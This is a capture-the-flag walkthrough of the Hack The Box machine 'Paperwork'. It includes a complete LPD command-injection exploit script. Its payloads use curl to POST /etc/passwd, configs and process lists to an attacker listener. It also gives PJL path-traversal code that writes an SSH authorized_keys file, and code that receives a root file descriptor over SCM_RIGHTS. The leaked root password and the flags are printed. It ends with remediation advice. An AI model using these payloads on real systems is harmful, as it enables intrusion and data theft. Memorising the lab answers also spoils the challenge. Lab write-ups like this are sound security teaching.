# 📄 Paperwork HTB — Full Walkthrough

**Machine**: Paperwork
**Target IP**: `10.129.75.57`
**OS**: Linux (Ubuntu)
**Difficulty**: Medium
**Tags**: `LPD` `RFC 1179` `Command Injection` `JetDirect` `PJL` `Path Traversal` `SCM_RIGHTS` `UNIX Socket` `Privilege Escalation`

---

## 📑 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [LPD Command Injection → RCE (Port 1515)](#2-lpd-command-injection--rce-port-1515)
3. [Intelligence Gathering via RCE](#3-intelligence-gathering-via-rce)
4. [JetDirect PJL Path Traversal → SSH (Port 9100)](#4-jetdirect-pjl-path-traversal--ssh-port-9100)
5. [Privilege Escalation → Root (SCM_RIGHTS fd leak)](#5-privilege-escalation--root-scm_rights-fd-leak)
6. [Full Attack Chain Summary](#6-full-attack-chain-summary)
7. [Key Findings & Techniques](#7-key-findings--techniques)
8. [Remediation](#8-remediation)

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV -p- -T4 10.129.75.57 -oN paperwork.nmap
```

**Open Ports:**

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH 10.0p2 Ubuntu |
| 80/tcp | HTTP | Nginx 1.28.0 — redirect to `paperwork.htb` |
| 1515/tcp | LPD | Custom print spooler (RFC 1179) |

### 1.2 Web Enumeration

```bash
# Add to /etc/hosts
echo "10.129.75.57 paperwork.htb" >> /etc/hosts
```

The web application is an **"Intranet | Document Archiving Service"** (Intake Portal). Key hints on the index page:

- **Protocol**: Compliance Level RFC 1179 (LPD)
- **Target Queue**: `archive_intake`
- **Internal Processor**: `/download/archive` → `paperwork-archive-v1.02` (ZIP archive)

### 1.3 Downloading the Processor

```bash
curl -s -o archive http://paperwork.htb/download/archive
file archive   # ZIP archive
unzip archive  # contains server.py (2,820 bytes)
```

The ZIP contains the **source code** of the LPD server running on port 1515 — a huge gift for exploitation.

---

## 2. LPD Command Injection → RCE (Port 1515)

### 2.1 Analyzing server.py

Key vulnerable snippet:

```python
job_name = ...  # from the 'J' line of the LPD control file
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log",
                 shell=True)   # <-- COMMAND INJECTION
```

The server:
- Reads the queue name (`VALID_QUEUE` from env, here `archive_intake`)
- Reads the control file lines (`H` host, `J` job name, `P` user)
- Builds a shell command with the **unsanitized `J` line** via `shell=True`

### 2.2 LPD Protocol Basics (RFC 1179)

1. Open TCP connection to port 1515
2. Send receive-job command: `\x02<queue>\n` → expect ACK `\x00`
3. Send subcommand header: `\x02 <size> <name>\n` → expect ACK `\x00`
4. Send control file content (`H`/`J`/`P` lines) → expect ACK `\x00`

### 2.3 Exploit Script

```python
#!/usr/bin/env python3
"""LPD RCE Exploit — paperwork.htb:1515 (queue: archive_intake)"""
import socket, sys, time

TARGET = ("10.129.75.57", 1515)
QUEUE = b"archive_intake"

def rce(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect(TARGET)
    s.send(b'\x02' + QUEUE + b'\n')
    ack1 = s.recv(10)
    if ack1 != b'\x00':
        print(f"[!] queue ack: {ack1!r}")
        s.close(); return False
    content = f"Hp\nJ{cmd}\nPr\nUdfA123\nfdfA123\n".encode()
    hdr = b'\x02 ' + str(len(content)).encode() + b' dfA123\n'
    s.send(hdr); time.sleep(0.2)
    s.send(content); time.sleep(0.4)
    try:
        s.settimeout(1)
        print(f"[*] acks: {s.recv(10)!r}")
    except Exception:
        pass
    s.close()
    return True

if __name__ == "__main__":
    rce(sys.argv[1])
```

### 2.4 Payload Injection

```bash
python3 exploit_lpd.py "';id;echo '"
python3 exploit_lpd.py "';cat /etc/passwd > /tmp/out.txt;curl -X POST -d @/tmp/out.txt http://10.10.15.253:8002/exfil;echo '"
```

**Proof of RCE** — SYN from target observed in tcpdump while sending a callback:

```
10.129.75.57.53680 > 10.10.15.253.7777: Flags [S], seq 3433930456
```

We now have **command execution as `lp`** (uid=7) on the box. Output exfiltration was done via a custom HTTP POST listener (port 8002).

---

## 3. Intelligence Gathering via RCE

### 3.1 /etc/passwd

```bash
python3 exploit_lpd.py "';cat /etc/passwd | curl -X POST -d @- http://10.10.15.253:8002/exfil;echo '"
```

Relevant user:

```
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

### 3.2 Nginx Configuration

```bash
python3 exploit_lpd.py "';cat /etc/nginx/sites-enabled/paperwork.htb | curl -X POST -d @- http://10.10.15.253:8002/exfil;echo '"
```

```nginx
server {
    listen 80;
    server_name paperwork.htb;
    location / {
        proxy_pass http://127.0.0.1:1337;   # Flask app (root)
        ...
    }
}
```

### 3.3 Process List

```bash
python3 exploit_lpd.py "';ps aux | curl -X POST -d @- http://10.10.15.253:8002/exfil;echo '"
```

| PID | User | Command |
|-----|------|---------|
| 968 | **root** | `/usr/bin/python3 /root/staging/CorpoSite/app.py` (Flask :1337) |
| 984 | **archivist** | `/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 ...` |
| 985 | **lp** | `/usr/bin/python3 /opt/LPDServer/server.py` (LPD :1515) |
| 1488 | **root** | `/usr/bin/python3 /usr/bin/paperwork-daemon` |

### 3.4 paperwork-daemon Source (readable)

```bash
python3 exploit_lpd.py "';cat /usr/bin/paperwork-daemon | curl -X POST -d @- http://10.10.15.253:8002/exfil;echo '"
```

Key logic:

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   # root-only file

def scan_for_malice():
    content = open(LOG_PATH).read().upper()
    if any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
        return True

def trigger_lockdown(conn):
    evidence_bundle = array.array("i", [log_fd, admin_fd])          # <-- fd leak!
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    ...
```

- Opens a root-only file and **passes its file descriptor via `SCM_RIGHTS`** when a "lockdown" is triggered.
- Listens on UNIX socket `/run/paperwork/mgmt.sock` (group `archivist`, `0660`).
- Lockdown triggers when `commands.log` contains `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`.

---

## 4. JetDirect PJL Path Traversal → SSH (Port 9100)

### 4.1 Fingerprinting the JetDirect Service

`jetdirect.py` (running as `archivist`) listens on `127.0.0.1:9100` and emulates an **HP LaserJet 4ML** PJL server:

```
\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X\r\n
→ HP LASERJET 4ML
```

### 4.2 Leaking jetdirect.py Source via FSUPLOAD

The PJL server implements a virtual filesystem rooted at `/home/archivist/printer/`. Since `lp` cannot read that directory, we leak the source through the protocol itself:

```python
s.sendall(b'\x1b%-12345X@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=99999\r\n\x1b%-12345X\r\n')
```

The vulnerable path translation:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))   # <-- path traversal!
```

`os.path.normpath()` resolves `..`, so `0:/../../../home/...` escapes the virtual root.

### 4.3 Writing an SSH Authorized Key

Using `@PJL FSDOWNLOAD` (arbitrary **file write** as `archivist`), we plant our SSH public key:

```bash
ssh-keygen -t ed25519 -f arch_key -N "" -C "archivist@paperwork"
```

```python
target = "0:/../../../home/archivist/.ssh/authorized_keys"
size = len(pubkey)
payload = (b"\x1b%-12345X@PJL FSDOWNLOAD NAME=\"" + target.encode()
           + b"\" SIZE=" + str(size).encode() + b"\r\n")
payload += pubkey
payload += b"\r\n\x1b%-12345X\r\n"
s.sendall(payload)
```

`os.makedirs(os.path.dirname(target), exist_ok=True)` automatically creates `/home/archivist/.ssh/`.

### 4.4 SSH Login as archivist

```bash
ssh -i arch_key archivist@10.129.75.57
```

```
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
```

**User Flag**:

```bash
cat /home/archivist/user.txt
# a63c7e2f101dc2bd43686f6edbdfdf7d
```

---

## 5. Privilege Escalation → Root (SCM_RIGHTS fd leak)

### 5.1 Triggering the Lockdown

As `archivist` we can connect to `/run/paperwork/mgmt.sock` (group `archivist`). Since `commands.log` is full of `FSUPLOAD`/`FSDOWNLOAD` entries from our previous activity, `scan_for_malice()` returns `True` and `trigger_lockdown()` fires — sending us the **file descriptors** for the log **and the root-only admin pins file** via `SCM_RIGHTS`.

### 5.2 Receiving File Descriptors

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
data, ancdata, flags, addr = s.recvmsg(2048, socket.CMSG_SPACE(16))
print(data)                       # b'ALERT: SECURITY_VIOLATION...'

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_type == socket.SCM_RIGHTS:
        a = array.array("i")
        a.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % a.itemsize)])
        print("FDs:", list(a))    # [4, 5]

# FD 5 = admin_fd → read the root-only config
os.lseek(5, 0, os.SEEK_SET)
print(os.read(5, 1024))
```

### 5.3 Admin Password Disclosure

```
FD 4 content: ... commands.log ...
FD 5 content: b'ADMIN_PASSWORD=ApparelMortuaryCedar22\n'
```

### 5.4 Root Shell via SSH

The admin password is reused for the `root` account:

```bash
sshpass -p 'ApparelMortuaryCedar22' ssh root@10.129.75.57
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Root Flag**:

```bash
cat /root/root.txt
# 436731a59842aafcd271a994ac98e55b
```

---

## 6. Full Attack Chain Summary

```
Port 1515 (LPD)                    Port 9100 (JetDirect)            UNIX Socket
┌──────────────────┐   RCE lp    ┌──────────────────────┐  SSH   ┌──────────────────────┐
│ /opt/LPDServer/  │───tulis────▶│ /home/archivist/     │──arch──▶│ /run/paperwork/      │
│ server.py (lp)   │  SSH key    │ printer/jetdirect.py │──ist──▶│ mgmt.sock (root)     │
│                  │             │ (archivist)          │        │ SCM_RIGHTS → fd      │
│ cmd injection    │             │ path traversal       │        │ admin_pins.conf      │
└──────────────────┘             └──────────────────────┘        └──────────┬───────────┘
                                                                            │ ADMIN_PASSWORD
                                                                    ┌───────▼────────┐
                                                                    │ SSH ROOT       │
                                                                    │ ApparelMortuary│
                                                                    │ Cedar22        │
                                                                    └────────────────┘
```

1. **LPD RCE (lp)** — Command injection in `server.py` `J` line (`shell=True`) on port 1515.
2. **Recon as lp** — Leaked `/etc/passwd`, nginx config, `ps aux`, and `paperwork-daemon` source; discovered JetDirect :9100 as `archivist` and the root `mgmt.sock` daemon.
3. **PJL Path Traversal (archivist)** — `@PJL FSUPLOAD` leaked `jetdirect.py`; `@PJL FSDOWNLOAD` with `0:/../../../home/archivist/.ssh/authorized_keys` planted an SSH key.
4. **SSH as archivist** — User flag `a63c7e2f101dc2bd43686f6edbdfdf7d`.
5. **SCM_RIGHTS fd leak (root)** — Connecting to `mgmt.sock` triggered lockdown which passed the root-only `admin_pins.conf` fd; leaked `ADMIN_PASSWORD=ApparelMortuaryCedar22`.
6. **SSH as root** — Root flag `436731a59842aafcd271a994ac98e55b`.

---

## 7. Key Findings & Techniques

| # | Finding | Technique |
|---|---------|-----------|
| 1 | **LPD command injection** (CWE-78) | Crafted RFC 1179 control file `J` line with `';cmd;echo '` |
| 2 | **Blind RCE output exfiltration** | Custom HTTP POST listener on port 8002; `curl -d @file` |
| 3 | **PJL virtual filesystem** | `@PJL FSUPLOAD` / `FSDIRLIST` / `INFO ID` protocol abuse |
| 4 | **Path traversal** (CWE-22) | `0:/../../../home/...` escapes the JetDirect root via `os.path.normpath` |
| 5 | **Arbitrary file write as archivist** | `@PJL FSDOWNLOAD` → SSH `authorized_keys` |
| 6 | **File descriptor leak via SCM_RIGHTS** | UNIX socket `sendmsg` passes root-only fd to unprivileged caller |
| 7 | **Password reuse** | `ADMIN_PASSWORD` from leaked config = root SSH password |

---

## 8. Remediation

1. **LPD server (`server.py`)** — Never use `shell=True` with user input. Use argument lists: `subprocess.run(["sh", "-c", "echo 'Archive: '", job_name])` and whitelist characters in `job_name`.
2. **JetDirect (`jetdirect.py`)** — Sanitize paths: `real = os.path.realpath(target); if not real.startswith(os.path.realpath(self._root)): return "FILEERROR=1"`.
3. **paperwork-daemon** — Do **not** pass sensitive file descriptors via `SCM_RIGHTS`. Replace with a challenge-response HMAC and rotate the admin password; store it hashed.
4. **Network** — Bind LPD (1515) to `127.0.0.1` instead of `0.0.0.0`; keep JetDirect and mgmt.sock internal.
5. **Password hygiene** — Use unique passwords per service/account.

---

## References

- [RFC 1179 — Line Printer Daemon Protocol](https://datatracker.ietf.org/doc/html/rfc1179)
- [PJL — Printer Job Language](https://developers.hp.com/system/files/tech-notes/PJL_Technical_Reference.pdf)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22 — Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [SCM_RIGHTS — Passing FDs over UNIX sockets](https://man7.org/linux/man-pages/man7/unix.7.html)
- OWASP A03:2021 Injection, A01:2021 Broken Access Control
